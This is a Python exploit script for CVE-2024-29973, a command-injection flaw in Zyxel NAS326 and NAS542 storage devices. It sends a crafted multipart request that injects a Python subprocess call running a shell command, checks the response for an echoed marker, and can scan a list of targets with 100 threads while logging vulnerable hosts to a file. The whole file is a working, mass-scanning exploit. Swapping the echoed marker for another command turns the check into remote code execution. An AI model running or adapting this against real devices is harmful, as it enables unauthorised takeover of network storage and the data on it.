import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """    
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗      ██████╗  █████╗  █████╗ ███████╗██████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ╚════██╗██╔══██╗██╔══██╗╚════██║╚════██╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗ █████╔╝╚██████║╚██████║    ██╔╝ █████╔╝
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝██╔═══╝  ╚═══██║ ╚═══██║   ██╔╝  ╚═══██╗
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║      ███████╗ █████╔╝ █████╔╝   ██║  ██████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝      ╚══════╝ ╚════╝  ╚════╝    ╚═╝  ╚═════╝ 
"""
    print(banner)


def poc(target):
    url = target+"/cmd,/simZysh/register_main/setCookie"
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
            "Connection": "close",
            "Content-Length": "255",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarygcflwtei",
            "Accept-Encoding": "gzip"
    }


    data="""------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="c0"\r\n\r\nstorage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("echo SGFjayBCeSBQcmF5", shell=True)#\r\n------WebKitFormBoundarygcflwtei--"""
    try:
        res = requests.post(data=data,url=url,headers=headers,verify=False,timeout=10)
        if  res.status_code == 200 and "SGFjayBCeSBQcmF5" in res.text:
                    print("[+] [CVE-2024-29973] "+target)
                    with open ('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
        else :
            print(f'[-]{target}不存在漏洞')
    except Exception as e:
        print(f'[?]{target}存在问题请手工注入')


def main():
    banner()
    parser = argparse.ArgumentParser(description="NAS326和Zyxel NAS542 操作系统命令注入漏洞")
    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == "__main__":
    main()